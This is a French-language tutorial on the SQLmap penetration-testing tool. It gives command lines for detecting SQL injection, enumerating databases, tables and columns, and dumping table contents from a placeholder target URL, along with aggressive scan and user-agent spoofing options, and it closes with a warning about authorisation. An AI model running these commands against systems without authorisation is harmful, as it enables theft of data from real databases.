# Guide d'utilisation de SQLmap

SQLmap est un outil open-source puissant permettant d'automatiser la détection et l'exploitation de vulnérabilités SQL Injection dans les bases de données.

## Installation

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py -h
```

## Usage de base

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1"
```

- `-u` : URL cible à tester.

## Tester différents types d'injection

SQLmap détecte automatiquement le type d'injection (Boolean-based, Error-based, Time-based, Union-based, etc.)

Pour spécifier explicitement :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" --technique=BEUSTQ
```

- `B` : Boolean-based
- `E` : Error-based
- `U` : Union query-based
- `S` : Stacked queries
- `T` : Time-based
- `Q` : Inline queries

## Identifier les bases de données

Lister les bases de données disponibles :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" --dbs
```

## Accéder à une base spécifique

Lister les tables d'une base :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" -D nom_base --tables
```

Lister les colonnes d'une table :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" -D nom_base -T nom_table --columns
```

Extraire les données d'une table :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" -D nom_base -T nom_table -C nom_colonne --dump
```

## Authentification

Si la cible nécessite une authentification par cookie :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" --cookie="PHPSESSID=abcd1234"
```

## Utiliser un fichier de requête HTTP

Vous pouvez capturer une requête avec Burp Suite ou autre proxy et la sauvegarder dans un fichier (`request.txt`). SQLmap peut alors exploiter directement cette requête :

```bash
python sqlmap.py -r request.txt
```

## Options utiles supplémentaires

- `--batch` : exécute automatiquement sans demander confirmation.
- `--random-agent` : utilise un User-Agent aléatoire.
- `--level` et `--risk` : ajustent l'agressivité du scan (1 à 5).

Exemple avancé :

```bash
python sqlmap.py -u "http://sitevulnerable.com/page.php?id=1" --batch --random-agent --level=5 --risk=3
```

## Prévenir les abus

Utilisez SQLmap uniquement sur des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite. Les tests non autorisés sont illégaux et peuvent entraîner des poursuites judiciaires.

